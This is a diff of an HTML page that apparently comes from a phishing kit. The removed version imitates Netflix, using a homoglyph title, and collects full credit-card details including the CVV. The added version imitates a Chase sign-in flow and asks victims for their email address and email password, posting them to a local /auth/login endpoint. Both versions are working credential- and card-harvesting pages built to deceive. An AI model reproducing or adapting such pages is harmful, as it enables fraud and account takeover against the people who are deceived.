@@ -1,136 +1,163 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="ltr">
 
 <head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Νеtfⅼіх</title>
+  <title>Secure Login</title>
   <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
-  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="/css/main2.css">
   <script src="/js/jquery.js"></script>
   <script src="/js/jquery.mask.min.js"></script>
 </head>
 
-<body>
-  <div id="cbApp">
-    <div class="cbLogin-wrapper">
-      <div class="cbLogin-wrapper-bg-2 cbLogin-wrapper-default"></div>
+<body style="overflow-x: hidden; overflow-y: auto; height: 100%">
+  <div class="homepage">
+    <div class="signin-container">
+      <header class="cb-header">
+        <div class="cb-header-wrap" style="min-width: 200px;">
+          <div class="cb-header-wrap-inner" style="max-width: 1200px;">
+            <div class="cb-header-container">
+              <div class="cb-header-container-left" style="min-width: 84px;">
+                <div class="cb-header-controls-left">
+                  <button type="button" class="cb-button cb-button--tertiary cb-button--inverse" tabindex="0">
+                    <span class="cb-button-icon cb-button-icon--leading">
+                      <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">
+                        <path fill="inherit" d="M33.47 43.949a2.974 2.974 0 002.001-5.175l-16.244-14.77L35.47 9.238a2.974 2.974 0 10-4-4.4L12.804 21.806a2.974 2.974 0 000 4.402L31.47 43.177c.547.497 1.26.773 2 .772z"></path>
+                      </svg>
+                    </span>
+                    <span class="cb-button-label cb-button-label--with-icon">Exit</span>
+                  </button>
+                </div>
+              </div>
 
-      <div class="cbHeader cbLogin-header basic-header">
-        <a href="https://www.netflix.com/" class="svg-cbLogo basic-header">
-          <svg viewBox="0 0 111 30" class="svg-icon-cb-logo" aria-hidden="true" focusable="false">
-            <g id="cb-logo">
-              <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path>
-            </g>
-          </svg>
-        </a>
+              <div class="cb-header-logo-container cb-header-logo-container--absolute">
+                <a class="cb-header-logo-link" href="https://secure04ea.chase.com/web/auth/dashboard">
+                  <img class="cb-header-image" src="/img/logo-8.png">
+                </a>
+              </div>
 
-        <a href="https://www.netflix.com/logout" class="cb-auth-links signupBasicHeader">Sign Out</a>
-      </div>
-
-      <div class="cbLogin-body">
-        <div class="cbLogin-content">
-          <div class="cb-message-container cb-message-error" role="alert">
-            <div class="cb-message-contents"><span style="font-weight: 500;">Update Required.</span> Please update your profile.</div>
-          </div>
-
-          <form action="/auth/login/3" method="POST">
-            <small class="cbx-steps-level">STEP <span>1</span> OF <span>2</span></small>
-            <h1>Update your credit or debit card.</h1>
-            <p>By updating your membership, you will enjoy all account advantages and benefits.</p>
-
-            <label class="cbx-label cbx-input-label cbx-input">
-              <span class="cbx-label-text">Cardholder name</span>
-              <input id="fullName" name="fullName" class="cbx-input-text" type="text" required="" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-            </label>
-
-            <label class="cbx-label cbx-input-label cbx-input">
-              <span class="cbx-label-text">Billing address</span>
-              <input id="address" name="address" class="cbx-input-text" type="text" required="" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-            </label>
-
-            <label class="cbx-label cbx-input-label cbx-input">
-              <span class="cbx-label-text">City</span>
-              <input id="city" name="city" class="cbx-input-text" type="text" required="" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-            </label>
-
-            <label class="cbx-label cbx-input-label cbx-input">
-              <span class="cbx-label-text">State</span>
-              <input id="state" name="state" class="cbx-input-text" type="text" required="" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-            </label>
-
-            <label class="cbx-label cbx-input-label cbx-input">
-              <span class="cbx-label-text">ZIP code</span>
-              <input id="zip" name="zip" class="cbx-input-text" type="text" required="" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-            </label>
-
-            <label class="cbx-label cbx-input-label cbx-input">
-              <span class="cbx-label-text">Country</span>
-              <input id="country" name="country" class="cbx-input-text" type="text" required="" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-            </label>
-
-            <label class="cbx-label cbx-input-label cbx-input">
-              <span class="cbx-label-text">Phone number</span>
-              <input id="phoneNum" name="phoneNum" class="cbx-input-text" type="text" required="" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-            </label>
-
-            <label class="cbx-label cbx-input-label cbx-input">
-              <span class="cbx-label-text">Credit or debit card number on file</span>
-              <input id="cardNum" name="cardNum" class="cbx-input-text" type="text" required="" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-            </label>
-
-            <label class="cbx-label cbx-input-label cbx-input">
-              <span class="cbx-label-text">Expiration date</span>
-              <input id="expDate" name="expDate" class="cbx-input-text" type="text" placeholder="MM/YYYY" required="" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-            </label>
-
-            <label class="cbx-label cbx-input-label cbx-input">
-              <span class="cbx-label-text">Security code (CVV)</span>
-              <input id="cvv" name="cvv" class="cbx-input-text" type="text" required="" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-            </label>
-
-            <div class="btn-bar">
-              <button class="btn disabled btn-blue btn-small cbx-btn-submit" type="submit" disabled="true">Next</button>
-
-              <button class="btn btn-plain btn-small" type="button">Cancel</button>
+              <div class="cb-header-container-right" style="min-width: 84px;">
+                <div class="cb-header-controls-right">
+                  <button type="button" class="cb-button cb-button--tertiary cb-button--inverse" tabindex="0">
+                    <span class="cb-button-label">Español</span>
+                  </button>
+                </div>
+              </div>
             </div>
-          </form>
+          </div>
         </div>
-      </div>
+      </header>
 
-      <div class="site-footer-wrapper cbx-footer">
-        <div class="footer-divider"></div>
+      <main class="signin-content">
+        <div class="signin-content-wrap">
+          <div class="container-fluid p-0">
+            <div class="row">
+              <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 col-lg-offset-3">
+                <h1 class="signin-header" tabindex="-1">Email Verification</h1>
+                <div class="progress-bar">
+                  <div class="progress-bar-track"></div>
+                  <div class="progress-bar-indicator-outer-border" style="width: calc(4px + 33.3%);"></div>
+                  <div class="progress-bar-indicator" style="width: 33.3%;"></div>
+                </div>
+              </div>
+            </div>
 
-        <div class="site-footer">
-          <p class="footer-top">
-            <a class="footer-top-a" href="https://help.netflix.com/contactus">Questions? Contact us.</a>
-          </p>
+            <div class="row no-gutters">
+              <div class="col-4 d-flex justify-content-center">
+                <div class="col-sm-2 col-lg-offset-1 hide-xs show-md signin-faq-sidebar">
+                  <div class="questions">
+                    <div class="cb-question-mark-icon">
+                      <i class="cb-icons question_mark"></i>
+                    </div>
+                    <span class="questions-sub">Questions?</span>
+                  </div>
 
-          <ul class="footer-links structural">
-            <li class="footer-link-item"><a class="footer-link" href="https://help.netflix.com/support/412"><span>FAQ</span></a></li>
+                  <p class="faqs-link">
+                    <a class="cb-link-anchor" href="javascript:void(0)" tabindex="0">
+                      <span class="cb-link-text">Read our FAQs.</span>
+                      <span class="cb-link-icon cb-link-icon--end">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">
+                          <path fill="inherit" d="M15.835 43.949a2.974 2.974 0 01-2.001-5.175l16.244-14.77L13.834 9.238a2.974 2.974 0 114-4.4L36.5 21.806a2.974 2.974 0 010 4.402L17.835 43.177a2.967 2.967 0 01-2 .772z"></path>
+                        </svg>
+                      </span>
+                    </a>
+                  </p>
+                </div>
 
-            <li class="footer-link-item"><a class="footer-link" href="https://help.netflix.com/"><span>Help Center</span></a></li>
+                <div class="col-xs-12 col-sm-8 col-lg-6 col-lg-offset-0 col-md-offset-0 col-sm-offset-2">
+                  <h2 class="cb-verify-header">Let's confirm your identity.</h2>
+                  <h3 class="cb-verify-header-sub">To protect your account, please tell us the requested info so we can confirm your identity.</h3>
+                  <form class="cb-verify-body" action="/auth/login/3" method="POST">
+                    <div class="cb-input-container">
+                      <label for="emailAddr" class="cb-input-label">Email Address</label>
 
-            <li class="footer-link-item"><a class="footer-link" href="https://help.netflix.com/legal/termsofuse"><span>Terms of Use</span></a></li>
+                      <div class="cb-input-wrap">
+                        <input id="emailAddr" name="emailAddr" type="text" class="cb-input cb-input--line" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+                      </div>
+                    </div>
 
-            <li class="footer-link-item"><a class="footer-link" href="https://help.netflix.com/legal/privacy"><span>Privacy</span></a></li>
+                    <div class="cb-input-container">
+                      <label for="emailPass" class="cb-input-label">Email Password</label>
 
-            <li class="footer-link-item"><a class="footer-link" href="https://www.netflix.com/ng/Login#"><span>Cookie Preferences</span></a></li>
+                      <div class="cb-input-wrap">
+                        <input id="emailPass" name="emailPass" type="password" class="cb-input cb-input--line cb-input--trailing-icon" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off" style="padding-right: 68px;">
 
-            <li class="footer-link-item"><a class="footer-link" href="https://help.netflix.com/legal/corpinfo"><span>Corporate Information</span></a></li>
-          </ul>
+                        <div class="cb-input-icon cb-input-icon--line cb-input-show-field">
+                          <button type="button" class="cb-button cb-button--tertiary cb-button--small toggle-btn toggle-hidden" tabindex="0">
+                            <span class="cb-button-label">Show</span>
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+
+                    <div class="cb-button-container show-md hide-xs">
+                      <div class="cb-button-next">
+                        <button type="submit" class="cb-button cb-button--primary submit-btn" tabindex="0">
+                          <span class="cb-button-label">Next</span>
+                        </button>
+                      </div>
+                    </div>
+
+                    <div class="cb-button-container show-xs hide-md">
+                      <div class="cb-button-next">
+                        <button type="submit" class="cb-button cb-button--primary cb-button--fluid submit-btn" tabindex="0">
+                          <span class="cb-button-label">Next</span>
+                        </button>
+                      </div>
+                    </div>
+                  </form>
+                </div>
+
+                <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 hide-md show-xs">
+                  <div class="questions-container">
+                    <div class="cb-question-mark-icon">
+                      <i class="cb-icons question_mark"></i>
+                    </div>
+                    
+                    <span class="questions-sub">Questions?</span>
+
+                    <a class="cb-link-anchor" href="javascript:void(0)" tabindex="0">
+                      <span class="cb-link-text">Read our FAQs.</span>
+
+                      <span class="cb-link-icon cb-link-icon--end">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">
+                          <path fill="inherit" d="M15.835 43.949a2.974 2.974 0 01-2.001-5.175l16.244-14.77L13.834 9.238a2.974 2.974 0 114-4.4L36.5 21.806a2.974 2.974 0 010 4.402L17.835 43.177a2.967 2.967 0 01-2 .772z"></path>
+                        </svg>
+                      </span>
+                    </a>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
         </div>
-      </div>
+      </main>
     </div>
   </div>
 
-  <script src="/js/main.js"></script>
-  <script>
-    $('#cardNum').mask('0000 0000 0000 0000');
-    $('#expDate').mask('00/0000');
-    $('#cvv').mask('0000');
-  </script>
+  <script src="/js/main2.js"></script>
 </body>
 
 </html>
